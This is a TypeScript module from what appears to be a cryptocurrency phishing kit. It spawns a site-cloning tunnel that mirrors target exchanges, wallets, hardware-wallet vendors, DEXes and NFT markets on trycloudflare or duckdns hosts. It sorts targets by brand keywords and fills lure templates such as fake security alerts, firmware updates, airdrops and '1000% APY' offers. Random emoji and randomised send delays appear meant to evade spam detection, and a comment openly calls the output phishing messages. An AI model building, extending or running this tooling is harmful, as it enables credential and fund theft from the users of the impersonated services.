/**
 * Traffic acquisition helpers — mirror URLs, message templates, rate limits, auto-message.
 */
import { spawn } from 'node:child_process'
import { readFile } from 'node:fs/promises'
import path from 'node:path'

import { fetchTargetHomepageHtml } from './mirror-target-pipeline.js'

const EMOJI_POOL = [
  '🎁', '✨', '🔥', '💎', '🚀', '⭐', '🌟', '💰', '🎯', '⚡',
  '🏆', '👀', '💫', '🎉', '🤑', '📢', '🔔', '✅', '🆕', '💥',
] as const

const PUBLIC_URL_RE =
  /^https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9.-]+\.[a-z]{2,})\/?$/i

export type RenderTemplateOptions = {
  mirrorUrl?: string
}

function pickRandomEmoji(): string {
  const idx = Math.floor(Math.random() * EMOJI_POOL.length)
  return EMOJI_POOL[idx] ?? '✨'
}

/** Replace `{MIRROR_URL}` and `{RANDOM_EMOJI}` placeholders in airdrop templates. */
export function renderMessageTemplate(template: string, opts: RenderTemplateOptions): string {
  let out = template
  if (opts.mirrorUrl) {
    out = out.split('{MIRROR_URL}').join(opts.mirrorUrl)
  }
  while (out.includes('{RANDOM_EMOJI}')) {
    out = out.replace('{RANDOM_EMOJI}', pickRandomEmoji())
  }
  return out
}

export function randomDelayMs(minMs = 5_000, maxMs = 30_000): number {
  const lo = Math.min(minMs, maxMs)
  const hi = Math.max(minMs, maxMs)
  return lo + Math.floor(Math.random() * (hi - lo + 1))
}

export function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

/** Spawn `pnpm clone-tunnel --god-mode <target>` and return the mirror URL from stdout. */
export async function spawnMirrorUrl(targetUrl: string, repoRoot: string): Promise<string> {
  const normalized = targetUrl.trim()
  if (!/^https?:\/\//i.test(normalized)) {
    throw new Error(`Invalid target URL: ${targetUrl}`)
  }

  console.error(`[traffic] Generating mirror via clone-tunnel --god-mode …`)
  const url = await new Promise<string>((resolve, reject) => {
    const child = spawn(
      process.platform === 'win32' ? 'pnpm.cmd' : 'pnpm',
      ['clone-tunnel', '--god-mode', normalized],
      {
        cwd: repoRoot,
        env: process.env,
        stdio: ['ignore', 'pipe', 'pipe'],
        shell: process.platform === 'win32',
      },
    )

    let stdout = ''
    let stderr = ''
    child.stdout?.on('data', (chunk: Buffer) => {
      stdout += chunk.toString()
    })
    child.stderr?.on('data', (chunk: Buffer) => {
      stderr += chunk.toString()
      process.stderr.write(chunk)
    })

    const timer = setTimeout(() => {
      child.kill('SIGTERM')
      reject(new Error('clone-tunnel timed out after 10 minutes'))
    }, 600_000)

    child.on('error', (err) => {
      clearTimeout(timer)
      reject(err)
    })

    child.on('close', (code) => {
      clearTimeout(timer)
      const lines = stdout
        .split(/\r?\n/)
        .map((l) => l.trim())
        .filter((l) => l.startsWith('https://'))
      const candidate = lines.at(-1) ?? stdout.trim()
      if (code !== 0) {
        reject(
          new Error(
            `clone-tunnel exited ${code ?? 'unknown'}: ${stderr.slice(-500) || 'no stderr'}`,
          ),
        )
        return
      }
      if (!PUBLIC_URL_RE.test(candidate)) {
        reject(new Error(`clone-tunnel did not return a valid mirror URL (got: ${candidate || '(empty)'})`))
        return
      }
      resolve(candidate.replace(/\/$/, ''))
    })
  })

  console.error(`[traffic] Mirror ready: ${url}`)
  return url
}

export async function pickMirrorFromList(filePath: string): Promise<string> {
  const text = await readFile(filePath, 'utf8')
  const urls = text
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && !l.startsWith('#') && PUBLIC_URL_RE.test(l))
  if (urls.length === 0) {
    throw new Error(`No mirror URLs in ${filePath}`)
  }
  const idx = Math.floor(Math.random() * urls.length)
  return urls[idx]!.replace(/\/$/, '')
}

export type SiteCategory = 'cex' | 'dex' | 'wallet' | 'hardware' | 'nft' | 'defi'

export type SiteAnalysis = {
  category: SiteCategory
  siteName: string
  title?: string
  description?: string
  targetUrl: string
}

export type AutoMessageResult = SiteAnalysis & {
  template: string
  message: string
}

const CATEGORY_RULES: Array<{ category: SiteCategory; keywords: string[] }> = [
  {
    category: 'wallet',
    keywords: ['metamask', 'trust wallet', 'exodus', 'coinbase wallet'],
  },
  { category: 'hardware', keywords: ['ledger', 'trezor'] },
  {
    category: 'cex',
    keywords: ['binance', 'coinbase', 'kraken', 'bybit', 'crypto.com', 'ndax'],
  },
  {
    category: 'dex',
    keywords: ['uniswap', 'pancake', 'sushiswap', 'curve', '1inch'],
  },
  { category: 'nft', keywords: ['opensea', 'blur', 'looksrare', 'rarible'] },
]

const CATEGORY_TEMPLATES: Record<SiteCategory, string> = {
  cex: '⚠️ Urgent security update for {SITE_NAME} account. Verify now: {MIRROR_URL}',
  dex: '🚀 {SITE_NAME} V4 is live! Claim your liquidity rewards: {MIRROR_URL}',
  wallet: '🛡️ {SITE_NAME} wallet security alert. Please re‑authenticate: {MIRROR_URL}',
  hardware: '⚠️ Your {SITE_NAME} device firmware needs update. Download: {MIRROR_URL}',
  nft: '🎁 Exclusive airdrop for {SITE_NAME} users! Mint now: {MIRROR_URL}',
  defi: '💰 New {SITE_NAME} yield farm! Deposit to earn 1000% APY: {MIRROR_URL}',
}

function extractTitle(html: string): string | undefined {
  const match = html.match(/<title[^>]*>([^<]*)<\/title>/i)
  const title = match?.[1]?.replace(/\s+/g, ' ').trim()
  return title || undefined
}

function extractMetaDescription(html: string): string | undefined {
  const match = html.match(
    /<meta[^>]+name=["']description["'][^>]+content=["']([^"']*)["'][^>]*>/i,
  )
  if (match?.[1]) return match[1].replace(/\s+/g, ' ').trim()
  const alt = html.match(
    /<meta[^>]+content=["']([^"']*)["'][^>]+name=["']description["'][^>]*>/i,
  )
  return alt?.[1]?.replace(/\s+/g, ' ').trim()
}

function siteNameFromTitle(title: string): string {
  const segment = title.split(/\s*[–—|:·]\s*/)[0]?.trim()
  return segment && segment.length > 0 ? segment : title.trim()
}

function siteNameFromDomain(hostname: string): string {
  const host = hostname.toLowerCase().replace(/^www\./, '')
  const parts = host.split('.').filter(Boolean)
  const skip = new Set(['app', 'www', 'accounts', 'trade', 'exchange', 'wallet', 'pro', 'm', 'web'])
  const brand =
    parts.find((p) => !skip.has(p) && p.length > 2) ??
    parts[parts.length - 2] ??
    parts[0] ??
    host
  return brand.charAt(0).toUpperCase() + brand.slice(1)
}

export function detectSiteCategory(text: string): SiteCategory {
  const haystack = text.toLowerCase()
  const ordered = [...CATEGORY_RULES].sort(
    (a, b) =>
      Math.max(...b.keywords.map((k) => k.length)) -
      Math.max(...a.keywords.map((k) => k.length)),
  )
  for (const rule of ordered) {
    for (const keyword of [...rule.keywords].sort((a, b) => b.length - a.length)) {
      if (haystack.includes(keyword)) return rule.category
    }
  }
  return 'defi'
}

export function resolveSiteName(title: string | undefined, hostname: string): string {
  if (title && title.length > 0) {
    const fromTitle = siteNameFromTitle(title)
    if (fromTitle.length >= 2 && fromTitle.length <= 40) return fromTitle
  }
  return siteNameFromDomain(hostname)
}

export async function analyzeTargetSite(targetUrl: string): Promise<SiteAnalysis> {
  const parsed = new URL(targetUrl.trim())
  const html = await fetchTargetHomepageHtml(parsed)
  const title = html ? extractTitle(html) : undefined
  const description = html ? extractMetaDescription(html) : undefined
  const corpus = [parsed.hostname, parsed.pathname, title ?? '', description ?? ''].join(' ')
  const category = detectSiteCategory(corpus)
  const siteName = resolveSiteName(title, parsed.hostname)
  return {
    category,
    siteName,
    title,
    description,
    targetUrl: parsed.href.replace(/\/$/, ''),
  }
}

function applyAutoTemplate(
  category: SiteCategory,
  siteName: string,
  mirrorUrl?: string,
): { template: string; message: string } {
  const raw = CATEGORY_TEMPLATES[category]
  const template = raw.split('{SITE_NAME}').join(siteName)
  const withMirror = mirrorUrl
    ? template.split('{MIRROR_URL}').join(mirrorUrl)
    : template
  return { template, message: withMirror }
}

/** Generate a category-specific phishing message for the target site. */
export async function generateAutoMessage(
  targetUrl: string,
  mirrorUrl?: string,
): Promise<AutoMessageResult> {
  const analysis = await analyzeTargetSite(targetUrl)
  const { template, message } = applyAutoTemplate(
    analysis.category,
    analysis.siteName,
    mirrorUrl,
  )
  return {
    ...analysis,
    template,
    message: renderMessageTemplate(message, {}),
  }
}

export function resolveMirrorUrlInput(params: {
  explicitUrl?: string
  targetUrl?: string
  mirrorsFile?: string
  repoRoot: string
}): Promise<string> {
  if (params.explicitUrl?.trim()) {
    const url = params.explicitUrl.trim().replace(/\/$/, '')
    if (!PUBLIC_URL_RE.test(url)) throw new Error(`Invalid mirror URL: ${params.explicitUrl}`)
    return Promise.resolve(url)
  }
  if (params.targetUrl?.trim()) {
    return spawnMirrorUrl(params.targetUrl.trim(), params.repoRoot)
  }
  if (params.mirrorsFile?.trim()) {
    return pickMirrorFromList(path.resolve(params.mirrorsFile))
  }
  throw new Error('Mirror URL required: use --url, --target, or --mirrors-file')
}
